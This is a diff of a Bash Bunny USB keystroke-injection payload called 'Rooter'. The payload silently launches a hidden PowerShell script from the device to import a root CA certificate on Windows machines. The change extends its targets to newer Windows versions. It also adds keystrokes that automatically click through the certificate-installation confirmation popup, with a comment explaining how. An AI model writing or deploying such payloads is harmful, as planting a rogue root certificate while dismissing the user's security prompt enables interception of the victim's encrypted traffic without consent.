@@ -3,7 +3,7 @@
 # Title:         Rooter
 # Author:        JRSmile
 # Version:       0.1
-# Target:        Windows XP SP3+
+# Target:        Windows Server 2012+2016+10
 # Props:         Hak5Darren/HAK5
 #
 # Executes a hidden powershell script that imports a root CA
@@ -17,5 +17,9 @@ ATTACKMODE HID STORAGE
 QUACK GUI r
 QUACK DELAY 100
 QUACK STRING powershell ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\install.ps1')"
+QUACK ENTER
+# Popup for Confirmation has to be acnowledged, alt-j in german alt-y in english (tab enter should work everytime)
+QUACK DELAY 1000
+QUACK TAB
 QUACK ENTER
 LED G
